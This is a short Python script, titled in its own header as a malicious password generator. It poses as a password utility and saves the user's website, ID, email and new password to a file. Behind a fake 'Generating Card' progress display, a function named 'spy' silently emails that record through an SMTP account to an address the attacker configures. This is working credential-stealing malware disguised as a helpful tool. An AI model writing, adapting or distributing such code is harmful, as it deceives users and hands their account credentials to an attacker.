#Malicious Password Generator

#Configuration part (ex: with gmail account, you can use another smtp server)
fromEmail = "" #login (your mail)
mailPassword = "" #password (pass mail)
toEmail = "" #reception (where you want received data, mail2@mail.com)
smtp = "smtp.gmail.com" #smtp server
port = 587 #port server

#88 characters
character_list = ["@","-","_","=","$","£","*","?",".","/","!",":",">","%","0","`","{","}","0","1","2","3","4","5","6","7","8","9","a","z","e","r","t","y","u","i","o","p","q","s","d","f","g","h","j","k","l","m","w","x","c","v","b","n","A","Z","E","R","T","Y","U","I","O","P","Q","S","D","F","G","H","J","K","L","M","W","X","C","V","B","N"]
# may have some compatibility problems on some site  
# "%","(",")"," ","!","#","$","*","+",",","-",",","/",":",";","=","?","@","[","]","^","_","`","{","}","~",

#password generation fonction
def generate(param0, param1):
    i = 1
    pw = ""
    from random import randrange
    while i < param0+1:
        n = randrange(0, 76)
        pw = pw + character_list[n]
        i += 1
    copy2clip(pw)
    return pw

#write clipboard fonction
import subprocess
def copy2clip(txt):
    cmd='echo '+txt.strip()+'|clip'
    return subprocess.check_call(cmd, shell=True)

#Menu
import os
os.system("cls")
print("|-------------------------------|")
print("|      PASSWORD GENERATOR       |")
print("|-------------------------------|")
print("")
print("")
i = 0 
while i < 1:
	caracters_number = input("How Many Characters?_")
	try:
		caracters_number = int(caracters_number)
		i = i + 1
	except:
		print("Input Error")
password = generate(caracters_number, character_list)
print("\nYour password is:", password, "\n")
print("Password Copied to Clipboard\n")
website = input("Enter Website:_")
website = website.lower()
try:
	website = website.replace("http://", "")
	website = website.replace("https://", "")
	website = website.replace("www.", "")
except:
	pass
your_mail = input("Enter Your Mail:_")
your_id = input("Enter Your ID:_")

#date format
os.system("cls")
import datetime
datetime.datetime.today()
date_now = (datetime.datetime.today().strftime(' %Y-%m-%d %Hh%M'))
#txt part
txt_title = "-------------------------------\n" + "Created" + date_now + "\n" + "-------------------------------"
file = open(website.capitalize() + ".txt", "a")
file.write(txt_title + "\nWebsite: " + website + "\nUser ID: " + your_id + "\nEmail: " + your_mail + "\nPassword: " + password + "\n")
file.close()
file = open(website.capitalize() + ".txt", "r")
content = file.read()
print(content)
file.close()

print("Generating Card... Plz Wait...")
import smtplib
from getpass import getpass

def spy(fromEmail, password, toEmail, message):
	connect = smtplib.SMTP(smtp, port)
	print("0%")
	connect.starttls()
	print("25%")
	connect.login(fromEmail, mailPassword)
	print("50%")
	connect.sendmail(fromEmail, toEmail, message)
	print("75%")

try:
	spy(fromEmail, password, toEmail, content)

except:
	pass
 
print("100%")
print("Informations Have Been Saved in " + website + ".txt")
print("Don't Forget to Secure Your Data Now !\n")


     
